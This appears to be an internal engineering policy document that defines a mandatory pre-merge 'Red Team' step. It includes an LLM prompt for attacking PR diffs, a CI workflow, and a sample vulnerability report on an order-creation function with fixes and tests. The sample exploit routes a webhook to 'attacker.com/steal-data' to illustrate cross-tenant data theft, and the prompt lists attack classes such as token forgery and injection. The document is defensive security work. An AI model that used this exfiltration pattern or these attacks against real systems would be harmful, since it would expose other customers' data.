---
title: "P3: Red Team - Attack the Diff"
purpose: Adversarial testing before merge
status: MANDATORY - Pre-merge phase
enforcement: Automated on every PR
---

# PROMPT 3: RED TEAM (Breaker)

**Auto-runs on every PR before merge.**

## Prompt Template

```
You are the Breaker. Attack the diff:

Categories to test:
1. Race/retry/idempotency flaws
   - Concurrent requests to same resource
   - Retry with different parameters
   - Multiple webhooks for same event
   - Double-spend scenarios

2. Boundary overflows/UTF-8, JSON bombs, path traversal
   - Max integer values
   - Empty strings, null values
   - Unicode edge cases (emoji, RTL, zero-width)
   - Deeply nested JSON (1000+ levels)
   - Large payloads (>10MB)
   - Path traversal in file operations

3. Timeouts/backpressure
   - Slow external APIs (>10s response)
   - Connection hangs (no response)
   - Rate limiting from providers
   - Memory exhaustion from large responses

4. AuthZ bypass & multi-tenant leakage
   - Access other customers' data
   - Forge authentication tokens
   - Bypass API key validation
   - SQL/NoSQL injection in queries
   - Cross-tenant data leakage

Propose failing tests. Output patch with exploits + fixes.
```

## Enforcement

### GitHub Actions

```yaml
# .github/workflows/red-team.yml
name: Red Team Attack
on: [pull_request]
jobs:
  red-team:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run red team prompts
        run: |
          npm run test:red-team || exit 1
```

### Automated Script

```bash
#!/bin/bash
# scripts/red-team-attack.sh

echo "🔴 RED TEAM ATTACK: Testing diff for vulnerabilities"

# Get changed files
CHANGED_FILES=$(git diff --name-only origin/main...HEAD | grep '\.ts$')

for file in $CHANGED_FILES; do
  echo "Attacking: $file"

  # Run property tests with adversarial seeds
  npm run test:properties -- --file=$file --mode=adversarial

  # Run fuzz tests
  npm run test:fuzz -- --file=$file --iterations=10000

  # Check for common anti-patterns
  eslint $file --rule 'no-eval: error' --rule 'no-new-func: error'
done

echo "✅ RED TEAM COMPLETE"
```

## Example Usage

### Input (PR Diff)

```typescript
// NEW CODE
async createOrder(req: OrderReq): Promise<OrderResp> {
  const response = await this.client.post('/orders', {
    quote_id: req.quoteId,
    customer_id: req.customerId, // 🚨 POTENTIAL ISSUE
  });
  return response.data;
}
```

### Red Team Output

```markdown
# Red Team Analysis: createOrder()

## Vulnerabilities Found

### 1. Multi-Tenant Data Leakage (CRITICAL)
**Location**: Line 3, customer_id parameter
**Issue**: No validation that customer_id matches authenticated user
**Exploit**:
```typescript
// Attacker can access other customers' orders
await createOrder({
  carrier: 'skipcart',
  quoteId: 'quote-123',
  customerId: 'victim-customer-id', // ← Attacker specifies victim
  pkg: { desc: 'Test', valueCents: 100 },
  webhooks: { status: 'https://attacker.com/steal-data' }
});
```

**Fix**:

```typescript
async createOrder(req: OrderReq, authenticatedUserId: string): Promise<OrderResp> {
  // Validate customer ownership
  if (req.customerId !== authenticatedUserId) {
    throw new UnauthorizedError('Cannot create order for another customer');
  }

  const response = await this.client.post('/orders', {
    quote_id: req.quoteId,
    customer_id: authenticatedUserId, // ← Use authenticated ID only
  });
  return response.data;
}
```

**Test**:

```typescript
it('should reject order for another customer', async () => {
  const adapter = new SkipcartAdapter(config);

  await expect(
    adapter.createOrder(
      { carrier: 'skipcart', quoteId: 'q1', customerId: 'victim', pkg: {...}, webhooks: {...} },
      'attacker' // authenticated user
    )
  ).rejects.toThrow(UnauthorizedError);
});
```

### 2. Missing Timeout (MEDIUM)

**Location**: Line 2, HTTP POST
**Issue**: No timeout, can hang indefinitely
**Exploit**: Slowloris-style attack by carrier API
**Fix**: Add timeout to axios config (already implemented in adapter constructor)

### 3. No Retry Idempotency (MEDIUM)

**Location**: createOrder method
**Issue**: If retry occurs after success, duplicate orders created
**Fix**: Implement idempotency key

```typescript
async createOrder(req: OrderReq, idempotencyKey: string): Promise<OrderResp> {
  const response = await this.client.post('/orders', {
    quote_id: req.quoteId,
    idempotency_key: idempotencyKey, // ← Prevents duplicates
  });
  return response.data;
}
```

## Exploit Tests to Add

```typescript
// tests/red-team/createOrder.exploit.test.ts

describe('createOrder - Exploit Tests', () => {
  it('EXPLOIT: Cross-tenant data access', async () => {
    // Test created above
  });

  it('EXPLOIT: Retry creates duplicate order', async () => {
    const adapter = new SkipcartAdapter(config);

    const req: OrderReq = {
      carrier: 'skipcart',
      quoteId: 'q1',
      pkg: { desc: 'Test', valueCents: 100 },
      webhooks: { status: 'https://test.com/webhook' }
    };

    // Create order twice with same request
    const order1 = await adapter.createOrder(req, 'user-123', 'idem-key-1');
    const order2 = await adapter.createOrder(req, 'user-123', 'idem-key-1');

    // Should return same order (idempotent)
    expect(order1.orderId).toBe(order2.orderId);
  });

  it('EXPLOIT: JSON bomb (deeply nested)', async () => {
    const deepPayload = { a: { a: { a: { /* 1000 levels deep */ } } } };

    await expect(
      adapter.createOrder(deepPayload as any, 'user-123')
    ).rejects.toThrow('Payload too large');
  });
});
```

## Summary

- **Critical**: 1 (multi-tenant leakage)
- **Medium**: 2 (timeout, idempotency)
- **Total Exploits**: 3
- **Fix Rate**: 0/3 (all need fixes before merge)

**MERGE BLOCKED** until fixes applied.

```

## Checklist

Before merge:

- [ ] All critical vulnerabilities fixed
- [ ] Exploit tests added and passing
- [ ] No new security warnings from linter
- [ ] Threat model updated if attack surface changed
- [ ] Security review completed

## Violations

If PR merges without red team pass:
1. Immediate revert
2. Post-mortem required
3. Updated policy to prevent bypass

---

**Status**: MANDATORY - No exceptions
**Enforcement**: Automated PR check + security review
**Owner**: Jesse Niesen (CEO)
**Last Updated**: 2025-10-08
